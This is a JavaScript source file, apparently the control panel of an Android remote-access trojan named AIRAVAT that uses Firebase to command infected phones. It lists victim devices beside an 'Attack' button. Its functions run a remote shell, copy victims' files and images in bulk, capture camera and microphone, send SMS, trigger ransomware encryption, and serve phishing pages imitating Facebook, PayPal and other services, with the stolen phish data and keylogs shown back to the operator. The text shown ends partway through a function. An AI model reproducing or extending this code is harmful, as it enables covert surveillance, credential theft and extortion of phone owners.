$("#preloaderr").fadeOut();
var thumbnailQueue = [];
var thumbnailIndex = 0;
var pendingThumbIndex = -1;
var thumbnailDir = "";
var THUMB_BATCH_SIZE = 400;
var thumbBatchActive = false;
var THUMB_TIMEOUT = 2000;
var isFetchingThumbnails = false;
var respov = $("#cmdref").val();
var var32 = "";
var batchStart = 0;
var unqid = "";
var manager = "";
var bckstp = 0;
var database = firebase.database();
var lastkeynot = "";
var lastkeykey = "";
var lastkeyphish = "";
var lastkeyvoice = "";
var wallpaperno = "";
var uo2 = document.getElementById("users");

// Variabili per il download batch di immagini
var imageDownloadQueue = [];
var imageDownloadIndex = 0;
var imageDownloadDir = "";
var imageDownloadBatchSize = 200;
var imageDownloadActive = false;
var imageDownloadTimeout = null;
var imageDownloadContent = [];
var downloadedImages = []; // Lista delle immagini già scaricate
var currentImageOffset = 0; // Offset per il prossimo batch
var currentFolderImages = []; // Tutte le immagini della cartella corrente

function opnav(o) {
    if ($("#navbar").css("display") == "none") {
        o.style.color = "red";
        o.innerHTML = "&#10005;";
        $("#navbar").css("display", "block");
    } else {
        o.style.color = "white";
        o.innerHTML = "&#8801;";
        $("#navbar").css("display", "none");
    }
}

var n = document.body.getAttribute("data-sig");

function showThumbnails() {
    if (thumbBatchActive) return;
    $("#preloaderr").fadeOut();

    if (thumbnailQueue.length === 0) {
        var respDiv = document.getElementById("resp");
        var fileItems = respDiv.querySelectorAll("li.im, li.fo, li.vi");
        var imageExtensions = /\.(jpg|jpeg|png|gif|bmp|webp)$/i;

        for (var i = 0; i < fileItems.length; i++) {
            var fileName = "";
            var child = fileItems[i].firstChild;
            while (child) {
                if (child.nodeType === 3) fileName += child.nodeValue;
                else if (child.tagName === "B") break;
                child = child.nextSibling;
            }
            fileName = fileName.trim();
            if (imageExtensions.test(fileName)) {
                thumbnailQueue.push(fileItems[i]);
            }
        }

        if (thumbnailQueue.length === 0) {
            alert("Nessuna immagine in questa cartella.");
            return;
        }

        thumbnailDir = var32;
        thumbnailIndex = 0;
    }

    if (thumbnailIndex === 0) {
        thumbnailQueue.reverse();
        console.log("Coda invertita. Primo elemento ora:", thumbnailQueue[0]?.innerText);
    }

    if (thumbnailIndex >= thumbnailQueue.length) {
        alert("Tutte le anteprime sono già state caricate.");
        return;
    }

    thumbBatchActive = true;
    batchStart = thumbnailIndex;
    var btn = document.querySelector("#gallery-controls button:first-child");
    if (btn) btn.disabled = true;

    fetchNextThumbnail();
}

function fetchNextThumbnail() {
    if (thumbnailIndex >= thumbnailQueue.length || (thumbnailIndex - batchStart >= THUMB_BATCH_SIZE)) {
        thumbBatchActive = false;
        var btn = document.querySelector("#gallery-controls button:first-child");
        if (btn) {
            btn.disabled = false;
            btn.textContent = "Carica altre " + THUMB_BATCH_SIZE + " anteprime";
        }
        var loader = document.getElementById("preloaderr");
        if (loader) loader.style.display = "none";
        if (document.getElementById("loadtxt")) document.getElementById("loadtxt").innerText =
            "Batch completato (" + thumbnailIndex + "/" + thumbnailQueue.length + ")";
        return;
    }

    var fileElement = thumbnailQueue[thumbnailIndex];
    var fileName = "";
    var child = fileElement.firstChild;
    while (child) {
        if (child.nodeType === 3) fileName += child.nodeValue;
        else if (child.tagName === "B") break;
        child = child.nextSibling;
    }
    fileName = fileName.trim();
    var fullPath = thumbnailDir + "/" + fileName;
    window._currentThumbElement = fileElement;
    manager = "thumbnailfetch";

    var loader = document.getElementById("preloaderr");
    if (loader) loader.style.display = "flex";
    document.getElementById("loadtxt").innerText =
        "Anteprima " + (thumbnailIndex + 1) + "/" + thumbnailQueue.length;

    setdatcmd("cd", fullPath, "", respov);

    var idx = thumbnailIndex;
    setTimeout(function() {
        if (manager === "thumbnailfetch" && idx === thumbnailIndex && idx < thumbnailQueue.length) {
            console.warn("Timeout per " + fileName);
            var loader = document.getElementById("preloaderr");
            if (loader) loader.style.display = "none";
            thumbnailIndex++;
            fetchNextThumbnail();
        }
    }, 10000);
}

function filesfol(respo, v1, v2, v3, var32) {
    var uo = document.getElementById("resp");
    uo.style.display = "block";

    var galleryPanel = document.getElementById("gallery-controls");
    if (!galleryPanel) {
        console.warn("gallery-controls non trovato nel DOM");
    } else {
        if (respo === "imgview" || respo === "fileview" || respo === "dialogview") {
            galleryPanel.style.display = "none";
        } else {
            galleryPanel.style.display = "block";
            galleryPanel.style.position = "fixed";
            galleryPanel.style.top = "55px";
            galleryPanel.style.left = "10px";
            galleryPanel.style.right = "10px";
            galleryPanel.style.zIndex = "99999";
            galleryPanel.style.background = "#001";
            galleryPanel.style.padding = "10px";
            galleryPanel.style.borderRadius = "5px";
            galleryPanel.style.textAlign = "center";
            
            // Aggiorna i controlli della galleria
            setTimeout(updateGalleryControls, 100);
        }
    }

    if (respo == "imgview") {
        document.getElementById("fprev").style.display = "block";
        document.getElementById("imv2").style.display = "none";
        document.getElementById("imv").style.display = "inline";
        document.getElementById("imv").src = "data:image/png;base64," + v1;
        document.getElementById("fprevdes").innerHTML = v2 + '<li><a download="" id="btdwn" target="_blank" href="data:image/png;base64,' + v1 + '">Download File</a><br>';
    } else if (respo == "fileview") {
        document.getElementById("fprev").style.display = "block";
        document.getElementById("imv2").style.display = "inline";
        document.getElementById("imv2").src = v1;
        document.getElementById("imv").style.display = "none";
        document.getElementById("fprevdes").innerHTML = v2 + '<li><a download="" id="btdwn" target="_blank" href="' + v1 + '">Download File</a><br>';
    } else if (respo == "dialogview") {
        showdialog(v1);
    } else {
        uo.innerHTML = "" + respo;
    }
}

// Funzione per ottenere tutte le immagini della cartella corrente
function getAllImagesInCurrentFolder() {
    var respDiv = document.getElementById("resp");
    if (!respDiv) return [];
    
    var fileItems = respDiv.querySelectorAll("li.im, li.vi");
    var imageExtensions = /\.(jpg|jpeg|png|gif|bmp|webp)$/i;
    var images = [];
    
    for (var i = 0; i < fileItems.length; i++) {
        var fileName = "";
        var child = fileItems[i].firstChild;
        while (child) {
            if (child.nodeType === 3) fileName += child.nodeValue;
            else if (child.tagName === "B") break;
            child = child.nextSibling;
        }
        fileName = fileName.trim();
        
        if (imageExtensions.test(fileName) && fileName.indexOf(".") !== 0) {
            images.push(fileName);
        }
    }
    
    return images;
}

// Funzione per aggiornare i controlli della galleria
function updateGalleryControls() {
    var galleryPanel = document.getElementById("gallery-controls");
    if (!galleryPanel) return;
    
    // Verifica se il pulsante esiste già
    var existingBtn = document.getElementById("download-images-btn");
    if (existingBtn) {
        existingBtn.remove();
    }
    
    // Ottieni tutte le immagini della cartella corrente
    currentFolderImages = getAllImagesInCurrentFolder();
    
    // Calcola quante immagini rimangono da scaricare
    var remainingImages = 0;
    for (var i = 0; i < currentFolderImages.length; i++) {
        if (downloadedImages.indexOf(currentFolderImages[i]) === -1) {
            remainingImages++;
        }
    }
    
    // Crea il nuovo pulsante
    var downloadBtn = document.createElement("button");
    downloadBtn.id = "download-images-btn";
    
    if (remainingImages > 0) {
        var batchSize = Math.min(imageDownloadBatchSize, remainingImages);
        downloadBtn.textContent = "Scarica " + batchSize + " immagini (rimanenti: " + remainingImages + ")";
    } else {
        downloadBtn.textContent = "Scarica " + imageDownloadBatchSize + " immagini";
    }
    
    downloadBtn.onclick = startImageBatchDownload;
    downloadBtn.style.marginLeft = "10px";
    downloadBtn.style.background = "#4CAF50";
    downloadBtn.style.color = "white";
    downloadBtn.style.border = "none";
    downloadBtn.style.padding = "8px 15px";
    downloadBtn.style.borderRadius = "5px";
    downloadBtn.style.cursor = "pointer";
    
    galleryPanel.appendChild(downloadBtn);
}

// Funzione per avviare il download batch di immagini
function startImageBatchDownload() {
    if (imageDownloadActive) return;
    
    // Ottieni tutte le immagini della cartella corrente
    currentFolderImages = getAllImagesInCurrentFolder();
    
    if (currentFolderImages.length === 0) {
        alert("Nessuna immagine trovata in questa cartella.");
        return;
    }
    
    // Filtra le immagini non ancora scaricate
    var imagesToDownload = [];
    for (var i = 0; i < currentFolderImages.length; i++) {
        if (downloadedImages.indexOf(currentFolderImages[i]) === -1) {
            imagesToDownload.push(currentFolderImages[i]);
        }
    }
    
    if (imagesToDownload.length === 0) {
        alert("Tutte le immagini sono già state scaricate. Reset della lista per un nuovo download.");
        downloadedImages = [];
        imagesToDownload = currentFolderImages.slice();
    }
    
    // Prendi il prossimo batch di immagini
    var batchImages = imagesToDownload.slice(0, imageDownloadBatchSize);
    
    if (batchImages.length === 0) {
        alert("Nessuna immagine da scaricare.");
        return;
    }
    
    // Imposta la coda di download
    imageDownloadQueue = batchImages;
    imageDownloadIndex = 0;
    imageDownloadDir = var32;
    imageDownloadContent = [];
    imageDownloadActive = true;
    
    // Disabilita il pulsante
    var btn = document.getElementById("download-images-btn");
    if (btn) {
        btn.disabled = true;
        btn.textContent = "Download in corso... (" + batchImages.length + " immagini)";
    }
    
    // Mostra il loader
    $("#preloaderr").fadeIn();
    document.getElementById("loadtxt").innerText = "Download immagini: 0/" + imageDownloadQueue.length;
    
    // Inizia il download
    downloadNextImage();
}

// Funzione per scaricare la prossima immagine
function downloadNextImage() {
    if (!imageDownloadActive) return;
    
    if (imageDownloadIndex >= imageDownloadQueue.length) {
        // Tutte le immagini del batch sono state scaricate, crea lo ZIP
        createImageZip();
        return;
    }
    
    var fileName = imageDownloadQueue[imageDownloadIndex];
    var fullPath = imageDownloadDir + "/" + fileName;
    
    document.getElementById("loadtxt").innerText = "Download immagini: " + (imageDownloadIndex + 1) + "/" + imageDownloadQueue.length + " - " + fileName;
    
    // Imposta timeout di sicurezza
    if (imageDownloadTimeout) {
        clearTimeout(imageDownloadTimeout);
    }
    
    imageDownloadTimeout = setTimeout(function() {
        console.warn("Timeout per: " + fileName);
        imageDownloadIndex++;
        downloadNextImage();
    }, 15000); // 15 secondi
    
    // Salva il nome del file corrente per il download
    window._currentDownloadImage = fileName;
    
    // Invia il comando per scaricare l'immagine
    manager = "imagedownload";
    setdatcmd("cd", fullPath, "", respov);
}

// Funzione per gestire il download delle immagini
function handleImageDownload(respo, v1, v2, v3) {
    if (!imageDownloadActive) return;
    
    // Cancella il timeout
    if (imageDownloadTimeout) {
        clearTimeout(imageDownloadTimeout);
        imageDownloadTimeout = null;
    }
    
    var fileName = window._currentDownloadImage;
    
    try {
        if (respo == "imgview" && v1) {
            imageDownloadContent.push({
                name: fileName,
                content: v1,
                type: "image"
            });
        } else if (respo == "fileview" && v1) {
            imageDownloadContent.push({
                name: fileName,
                content: v1,
                type: "file"
            });
        }
    } catch (e) {
        console.warn("Errore nel download di: " + fileName, e);
    }
    
    // Passa alla prossima immagine
    imageDownloadIndex++;
    
    // Piccolo ritardo per evitare di sovraccaricare il browser
    setTimeout(function() {
        $("#preloaderr").fadeIn();
        downloadNextImage();
    }, 300);
}

// Funzione per creare lo ZIP delle immagini
async function createImageZip() {
    try {
        document.getElementById("loadtxt").innerText = "Creazione ZIP immagini...";
        
        if (imageDownloadContent.length === 0) {
            alert("Nessuna immagine scaricata");
            imageDownloadActive = false;
            var btn = document.getElementById("download-images-btn");
            if (btn) {
                btn.disabled = false;
                updateGalleryControls();
            }
            $("#preloaderr").fadeOut();
            return;
        }
        
        var zip = new JSZip();
        
        for (var i = 0; i < imageDownloadContent.length; i++) {
            var img = imageDownloadContent[i];
            
            try {
                if (img.type === "image") {
                    // Converti base64 in blob
                    var binaryData = atob(img.content);
                    var array = new Uint8Array(binaryData.length);
                    for (var j = 0; j < binaryData.length; j++) {
                        array[j] = binaryData.charCodeAt(j);
                    }
                    zip.file(img.name, array);
                } else {
                    // File generico
                    zip.file(img.name, img.content);
                }
                
                // Aggiungi l'immagine alla lista delle già scaricate
                if (downloadedImages.indexOf(img.name) === -1) {
                    downloadedImages.push(img.name);
                }
            } catch (e) {
                console.warn("Errore nell'aggiunta di: " + img.name, e);
            }
            
            if (i % 20 === 0) {
                document.getElementById("loadtxt").innerText = "Aggiunta immagini: " + (i + 1) + "/" + imageDownloadContent.length;
                await new Promise(resolve => setTimeout(resolve, 50));
            }
        }
        
        document.getElementById("loadtxt").innerText = "Generazione ZIP...";
        var content = await zip.generateAsync({
            type: "blob",
            compression: "DEFLATE",
            compressionOptions: { level: 6 }
        });
        
        // Scarica lo ZIP
        var url = URL.createObjectURL(content);
        var a = document.createElement('a');
        a.href = url;
        a.download = "immagini_" + new Date().getTime() + ".zip";
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        URL.revokeObjectURL(url);
        
        // Calcola quante immagini rimangono
        var remainingImages = 0;
        for (var i = 0; i < currentFolderImages.length; i++) {
            if (downloadedImages.indexOf(currentFolderImages[i]) === -1) {
                remainingImages++;
            }
        }
        
        if (remainingImages > 0) {
            alert("Download completato! " + imageDownloadContent.length + " immagini scaricate come ZIP.\n\nImmagini rimanenti: " + remainingImages);
        } else {
            alert("Download completato! Tutte le " + downloadedImages.length + " immagini sono state scaricate.");
            // Reset per permettere un nuovo download
            downloadedImages = [];
        }
    } catch (e) {
        console.error("Errore nella creazione dello ZIP:", e);
        alert("Errore nel download delle immagini: " + e.message);
    }
    
    imageDownloadActive = false;
    imageDownloadContent = [];
    
    // Aggiorna il pulsante
    updateGalleryControls();
    
    $("#preloaderr").fadeOut();
}

// Funzione per resettare il download delle immagini
function resetImageDownload() {
    downloadedImages = [];
    currentImageOffset = 0;
    imageDownloadQueue = [];
    imageDownloadIndex = 0;
    imageDownloadContent = [];
    imageDownloadActive = false;
    currentFolderImages = [];
    
    if (imageDownloadTimeout) {
        clearTimeout(imageDownloadTimeout);
        imageDownloadTimeout = null;
    }
}

function hidekarbsdk() {
    $("#micrec").css("display", "none");
    $("#wallpaperdiv").css("display", "none");
    $("#senddm").css("display", "none");
    $("#pvtt").css("display", "none");
    $("#toastdiv").css("display", "none");
    $("#notikey").css("display", "none");
    $("#viewers").css("display", "none");
    $("#fprev").css("display", "none");
    $("#resp").css("display", "none");
    $("#shellcmd").css("display", "none");
    $("#showphishj").css("display", "none");
    $("#camview").css("display", "none");
    $("#ransomdiv").css("display", "none");
}

function userss() {
    var o = "hiddenser";
    var database = firebase.database();
    localStorage.setItem("airavatpass", o);
    var ref = database.ref("/online/online" + n);
    ref.on("value", (snapshot) => {
        if (snapshot.exists()) {
            var scores = snapshot.val();
            var keys = Object.keys(scores);
            uo2.innerHTML = "<br>";
            for (var i = 0; i < keys.length; i++) {
                var k = keys[i];
                var aversion = scores[k].device.android;
                var battery = scores[k].device.battery;
                var model = scores[k].device.phone;
                var ip = scores[k].device.rooted;
                var uid = scores[k].device.id;
                uo2.innerHTML += '<br><div class="usr" >' + model + ' <span style="float:right" >' + aversion + '</span><br><br>Rooted: ' + ip + ' <span style="float:right" >Battery: ' + battery + ' </span><br><br><center><button onclick="setdev(' + "'" + uid + "'" + ')">Attack</button></center></div> ';
            }
        } else {
            uo2.innerHTML = "No online Devices";
        }
    });
}
userss();

function setdev(o) {
    respov = "/comds/comds" + o;
    unqid = o;
    $("#cmdref").val("/comds/comds" + o);
    showdat(o);
    $("#users").css("display", "none");
    $("#backkk").css("display", "block");
    $("#phones").css("display", "block");
}

function setdatcmd(o, p, q, r) {
    var result = '';
    var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    var charactersLength = characters.length;
    for (var i = 0; i < 8; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    var store = {
        cmdn: o,
        cmdv: p,
        cmdvar: q,
        rndm: result
    };
    $("#phones").css("display", "none");
    $("#preloaderr").fadeIn();
    var con = database.ref(r).child("comdss").set(store);
}

function cmd() {
    var database = firebase.database();
    var us = document.getElementById("cmdref").value;
    var ref = database.ref(us);
    var hio = document.getElementById("cmd").value;
    var hio2 = document.getElementById("cmdvar").value;
    var hio3 = document.getElementById("cmdvarm").value;
    setdatcmd(hio, hio2, hio3, us);
}

function showdat(o) {
    var database = firebase.database();
    var ref = database.ref("respos/respo" + o);
    ref.on("child_changed", (snapshot) => {
        if (snapshot.exists()) {
            var dat = snapshot.val();
            var respo = dat.respo + "";
            var v1 = dat.v1 + "";
            var v2 = dat.v2 + "";
            var v3 = dat.v3 + "";

            if (manager != "thumbnailfetch" && manager != "imagedownload") {
                var32 = dat.var2 + "";
            }

            $("#preloaderr").fadeOut();

            if (manager == "filesmanager") {
                filesfol(respo, v1, v2, v3, var32);
            } else if (manager == "imagedownload") {
                handleImageDownload(respo, v1, v2, v3);
            } else if (manager == "fileview") {
                fileev(v1);
            } else if (manager == "shellview") {
                shellviewer(v1);
            } else if (manager == "deviceinfo") {
                showinfodev(v1);
            } else if (manager == "dialogview") {
                showdialog(v1);
            } else if (manager == "camview") {
                document.getElementById("camview").style.display = "block";
                document.getElementById("camimg").src = v1;
                document.getElementById("downlocam").href = v1;
            } else if (manager == "thumbnailfetch") {
                var thumbEl = window._currentThumbElement;
                if (respo == "imgview" && v1 && thumbEl) {
                    var img = document.createElement("img");
                    img.src = "data:image/png;base64," + v1;
                    img.style.maxWidth = "80px";
                    img.style.maxHeight = "80px";
                    img.style.margin = "2px";
                    img.style.cursor = "pointer";
                    img.title = "Clicca per aprire";

                    var originalText = "";
                    var child = thumbEl.firstChild;
                    while (child) {
                        if (child.nodeType === 3) originalText += child.nodeValue;
                        else if (child.tagName === "B") break;
                        child = child.nextSibling;
                    }
                    originalText = originalText.trim();

                    var container = document.createElement("span");
                    container.appendChild(img);
                    container.appendChild(document.createTextNode(" " + originalText));
                    thumbEl.parentNode.replaceChild(container, thumbEl);

                    container.onclick = function(e) {
                        e.stopPropagation();
                        setdatcmd("cd", thumbnailDir + "/" + originalText, "", respov);
                        manager = "fileview";
                    };
                } else if (respo == "fileview" && v1 && thumbEl) {
                    var img = document.createElement("img");
                    img.src = v1;
                    img.style.maxWidth = "80px";
                    img.style.maxHeight = "80px";
                    img.style.margin = "2px";
                    img.style.cursor = "pointer";
                    img.title = "Clicca per aprire";

                    var originalText = "";
                    var child = thumbEl.firstChild;
                    while (child) {
                        if (child.nodeType === 3) originalText += child.nodeValue;
                        else if (child.tagName === "B") break;
                        child = child.nextSibling;
                    }
                    originalText = originalText.trim();

                    var container = document.createElement("span");
                    container.appendChild(img);
                    container.appendChild(document.createTextNode(" " + originalText));
                    thumbEl.parentNode.replaceChild(container, thumbEl);

                    container.onclick = function(e) {
                        e.stopPropagation();
                        setdatcmd("cd", thumbnailDir + "/" + originalText, "", respov);
                        manager = "fileview";
                    };
                }

                thumbnailIndex++;
                fetchNextThumbnail();
            }
        } else {
            console.log("No data available");
        }
    });
}

function backk(o) {
    if ($("#users").css("display") == "none" && $("#phones").css("display") == "none") {
        hidekarbsdk();
        $("#users").css("display", "none");
        $("#phones").css("display", "block");
    } else if ($("#users").css("display") == "none" && $("#phones").css("display") != "none") {
        hidekarbsdk();
        $("#backkk").css("display", "none");
        $("#users").css("display", "block");
        $("#phones").css("display", "none");
    } else {

    }
}

function clrn() {
    if (confirm("Are You Sure To delete all Keylogs")) {
        firebase.database().ref("notilogo").remove();
    }
}

function clrk() {
    if (confirm("Are You Sure To delete all Keylogs")) {
        firebase.database().ref("logolog").remove();
    }
}

function clrv() {
    if (confirm("Are You Sure To delete all Recordings")) {
        firebase.database().ref("records").remove();
    }
}

function clrpi() {
    if (confirm("Are You Sure To delete all Phish Data")) {
        firebase.database().ref("pdata").remove();
    }
}

function showphish() {
    manager = "notikey";
    if (manager == "notikey") {
        var psdus = document.getElementById("notikey");
        hidekarbsdk();
        $("#preloaderr").fadeIn();
        $("#phones").css("display", "none");
        var database = firebase.database();
        var ref = database.ref("pdata/pdataonline" + n);
        ref.limitToFirst(10).on("value", gotData);

        function gotData(data) {
            $("#preloaderr").fadeOut();
            psdus.style.display = "block";
            psdus.innerHTML = '<div onclick="clrpi()" class="down" ><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-trash" viewBox="0 0 16 16"><path d="M5.5 5.5A.5.5 0 0 1 6 6v6a.5.5 0 0 1-1 0V6a.5.5 0 0 1 .5-.5zm2.5 0a.5.5 0 0 1 .5.5v6a.5.5 0 0 1-1 0V6a.5.5 0 0 1 .5-.5zm3 .5a.5.5 0 0 0-1 0v6a.5.5 0 0 0 1 0V6z"/><path fill-rule="evenodd" d="M14.5 3a1 1 0 0 1-1 1H13v9a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V4h-.5a1 1 0 0 1-1-1V2a1 1 0 0 1 1-1H6a1 1 0 0 1 1-1h2a1 1 0 0 1 1 1h3.5a1 1 0 0 1 1 1v1zM4.118 4 4 4.059V13a1 1 0 0 0 1 1h6a1 1 0 0 0 1-1V4.059L11.882 4H4.118zM2.5 3V2h11v1h-11z"/></svg></div>';
            if (data.exists()) {
                var scores = data.val();
                var keys = Object.keys(scores);
                var i = 0;
                for (i = (keys.length - 1); i > -1; i--) {
                    var k = keys[i];
                    var data2 = scores[k].data;
                    psdus.innerHTML += '<div class="keylogg" >' + data2 + "</div>";
                }
                if (lastkeyphish != (keys[keys.length - 1] + "") && parseInt(keys.length) >= 10) {
                    lastkeyphish = keys[keys.length - 1] + "";
                    psdus.innerHTML += "<br><center><button class='btn' " + 'onclick="showphishu(this,' + "'" + lastkeyphish + "'" + ')"' + ">Load More</button></center><br>";
                }
                lastkeyphish = keys[keys.length - 1] + "";
            } else {
                psdus.innerHTML = '<div class="keylogg" ><h4>No Victims Found<h4></div>';
            }
        }
    }
}

function showphishu(o, p) {
    manager = "notikey";
    if (manager == "notikey") {
        o.innerHTML = ".....";
        o.disabled = true;
        var psdus = document.getElementById("notikey");
        var database = firebase.database();
        var ref = database.ref("pdata/pdataonline" + n);
        ref.orderByKey().startAt(p).limitToFirst(10).on("value", gotData);

        function gotData(data) {
            if (data.exists()) {
                var scores = data.val();
                var keys = Object.keys(scores);
                var i = 0;
                psdus.style.display = "block";
                o.style.display = "none";
                for (i = (keys.length - 1); i > -1; i--) {
                    var k = keys[i];
                    var data2 = scores[k].data;
                    psdus.innerHTML += '<div class="keylogg" >' + data2 + "</div>";
                }
                if (lastkeyphish != (keys[keys.length - 1] + "") && parseInt(keys.length) >= 10) {
                    lastkeyphish = keys[keys.length - 1] + "";
                    psdus.innerHTML += "<br><center><button class='btn' " + 'onclick="showphishu(this,' + "'" + lastkeyphish + "'" + ')"' + ">Load More</button></center><br>";
                }
                lastkeyphish = keys[keys.length - 1] + "";
            } else {
                psdus.innerHTML = '<div class="keylogg" ><h4>No Victims Found<h4></div>';
            }
        }
    }
}

function changewallpaper() {
    hidekarbsdk();
    manager = "dialogview";
    $("#phones").css("display", "none");
    $("#users").css("display", "none");
    $("#wallpaperdiv").css("display", "block");
}

function setwalls() {
    alert(wallpaperno)
    setdatcmd("changewall", wallpaperno, "", respov);
}

function selectimg(o, p) {
    for (var u = 0; u < 3; u++) {
        $(".wallimg").children().eq(u).css("border", "none")
    }
    $(o).css("border", "2px solid red");
    wallpaperno = p + "";
}

function setdatcmd2(o, p, q, s, r) {
    var result = '';
    var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    var charactersLength = characters.length;
    for (var i = 0; i < 8; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    var store = {
        cmdn: o,
        cmdv: p,
        cmdvar: q,
        cmdvar2: s,
        rndm: result
    };
    $("#phones").css("display", "none");
    $("#preloaderr").fadeIn();
    var con = database.ref(r).child("comdss").set(store);
}

function iojh() {
    var yi = ['dropbox3.png', 'facebook2.png', 'facebook5.png', 'free_fire3.png', 'github1.png', 'instagram1.png', 'linkedin1.png', 'messenger1.png', 'microsoft1.png', 'netflix1.png', 'paypal2.png', 'protonmail1.png', 'pubg2.png', 'snapchat1.png', 'tumblir1.png', 'twitter1.png', 'wordpress1.png', 'yahoo1.png'];
    document.getElementById("hion").src = "./imgg/" + yi[parseInt($("#lshpih").val())];
}

function execphish() {
    setdatcmd2("phpage", $("#phpage").val(), $("#nshpih").val(), $("#lshpih").val(), "comds/comds" + unqid + "phi");
}

function execphish2() {
    setdatcmd2("cust", $("#shpih").val(), $("#nshpih").val(), $("#lshpih").val(), "comds/comds" + unqid + "phi");
}

function recordvoice() {
    setdatcmd("micrec", (parseInt($("#recval").val()) * 1000), "", "comds/comds" + unqid + "phi");
}

function micrec() {
    voicess();
    hidekarbsdk();
    manager = "dialogview";
    $("#phones").css("display", "none");
    $("#users").css("display", "none");
    $("#micrec").css("display", "block");
}

function sendsms() {
    if ((!isNaN($("#smsnumber").val())) && $("#smscontent").val() != "") {
        setdatcmd("sendsms", $("#smsnumber").val(), $("#smscontent").val(), respov);
    } else {
        alert("Please Enter Valid Data");
    }
}

function sendmsg() {
    hidekarbsdk();
    manager = "dialogview";
    $("#phones").css("display", "none");
    $("#users").css("display", "none");
    $("#senddm").css("display", "block");
}

function ttsf() {
    if ($("#ttscmd").val() != "") {
        setdatcmd("ttsdev", $("#ttscmd").val(), "", respov);
    } else {
        alert("Please Enter Valid Text");
    }
}

function webssow() {
    if ($("#webscmd").val() != "") {
        setdatcmd("openweburi", $("#webscmd").val(), "", respov);
    } else {
        alert("Please Enter Valid URL");
    }
}

function vibra() {
    if (!isNaN($("#vibratecmd").val())) {
        setdatcmd("vibratedev", ($("#vibratecmd").val() * 1000), "", respov);
    } else {
        alert("Please Enter Valid Time");
    }
}

function playmus() {
    if ($("#musiccmd").val().indexOf(".mp3") > 0) {
        setdatcmd("playsmusic", $("#musiccmd").val(), "", respov);
    } else {
        alert("Please Enter Valid URL");
    }
}

function showphpag() {
    hidekarbsdk();
    manager = "dialogview";
    $("#phones").css("display", "none");
    $("#users").css("display", "none");
    $("#showphishj").css("display", "block");
}

function funcmd(o) {
    hidekarbsdk();
    var ooj = '#' + o;
    $("#plmc").css('display', 'none');
    $("#vibradev").css('display', 'none');
    $("#ttsdev").css('display', 'none');
    $("#webdev").css('display', 'none');
    $(ooj).css('display', 'block');
    manager = "dialogview";
    $("#phones").css("display", "none");
    $("#users").css("display", "none");
    $("#pvtt").css("display", "block");
}

function showdialog(o) {
    $("#diamain").css("display", "flex");
    $("#diatext").html(o);
}

function toastt() {
    hidekarbsdk();
    manager = "dialogview";
    $("#phones").css("display", "none");
    $("#users").css("display", "none");
    $("#toastdiv").css("display", "block");
}

function ransomwares() {
    hidekarbsdk();
    manager = "dialogview";
    $("#phones").css("display", "none");
    $("#users").css("display", "none");
    $("#ransomdiv").css("display", "block");
}

function ransomen() {
    setdatcmd("ransom1", $("#ransomcmd").val(), "", respov);
}

function ransomde() {
    setdatcmd("ransom2", $("#ransomcmd").val(), "", respov);
}

function toastexc() {
    setdatcmd("toasttext", $("#toastcmd").val(), "", respov);
}

function deviceinfo() {
    hidekarbsdk();
    manager = "deviceinfo";
    $("#phones").css("display", "none");
    $("#users").css("display", "none");
    setdatcmd("deviceinfo", "", "", respov);
}

function siminfo() {
    hidekarbsdk();
    manager = "deviceinfo";
    $("#phones").css("display", "none");
    $("#users").css("display", "none");
    setdatcmd("simcardinfo", "", "", respov);
}

function showinfodev(o) {
    hidekarbsdk();
    $("#notikey").css("display", "block");
    $("#notikey").html(o);
}

function startshell() {
    hidekarbsdk();
    manager = "shellview";
    $("#phones").css("display", "none");
    $("#users").css("display", "none");
    $("#shellcmd").css("display", "block");
}

function shellcm(o) {
    if (event.keyCode === 13) {
        setdatcmd("shellcmd", o.value, "", respov);
    }
}

function logsout() {
    localStorage.setItem("logino", "false");
    window.location.href = "";
}

function shellviewer(o) {
    $("#shellcmd").css("display", "block");
    $("#shelldata").html("AIRAVAT Shell<br><br>" + o.replaceAll("\n", "<br>"))
}

function convertTimestamp(timestamp) {
    var d = new Date(timestamp),
        yyyy = d.getFullYear(),
        mm = ('0' + (d.getMonth() + 1)).slice(-2),
        dd = ('0' + d.getDate()).slice(-2),
        hh = d.getHours(),
        h = hh,
        min = ('0' + d.getMinutes()).slice(-2),
        ampm = 'AM',
        time;
    if (hh > 12) {
        h = hh - 12;
        ampm = 'PM';
    } else if (hh === 12) {
        h = 12;
        ampm = 'PM';
    } else if (hh == 0) {
        h = 12;
    }
    time = yyyy + '-' + mm + '-' + dd + ', ' + h + ':' + min + ' ' + ampm;
    return time;
}

function voicess() {
    manager = "notikey";
    if (manager == "notikey") {
        var psdus = document.getElementById("showrecs");
        $("#preloaderr").fadeIn();
        $("#phones").css("display", "none");
        var database = firebase.database();
        var ref = database.ref("records/" + unqid);
        ref.limitToFirst(10).once("value", gotData);

        function gotData(data) {
            $("#preloaderr").fadeOut();
            psdus.style.display = "block";
            psdus.innerHTML = '<div onclick="clrv()" class="down" ><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-trash" viewBox="0 0 16 16"><path d="M5.5 5.5A.5.5 0 0 1 6 6v6a.5.5 0 0 1-1 0V6a.5.5 0 0 1 .5-.5zm2.5 0a.5.5 0 0 1 .5.5v6a.5.5 0 0 1-1 0V6a.5.5 0 0 1 .5-.5zm3 .5a.5.5 0 0 0-1 0v6a.5.5 0 0 0 1 0V6z"/><path fill-rule="evenodd" d="M14.5 3a1 1 0 0 1-1 1H13v9a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V4h-.5a1 1 0 0 1-1-1V2a1 1 0 0 1 1-1H6a1 1 0 0 1 1-1h2a1 1 0 0 1 1 1h3.5a1 1 0 0 1 1 1v1zM4.118 4 4 4.059V13a1 1 0 0 0 1 1h6a1 1 0 0 0 1-1V4.059L11.882 4H4.118zM2.5 3V2h11v1h-11z"/></svg></div>';
            if (data.exists()) {
                var scores = data.val();
                var keys = Object.keys(scores);
                var i = 0;
                var rndm = 'recs' + Math.floor((Math.random() * 1000) + 100);
                var rndm2 = '.' + rndm;
                for (i = (keys.length - 1); i > -1; i--) {
                    var k = keys[i];
                    var recs = scores[k].url;
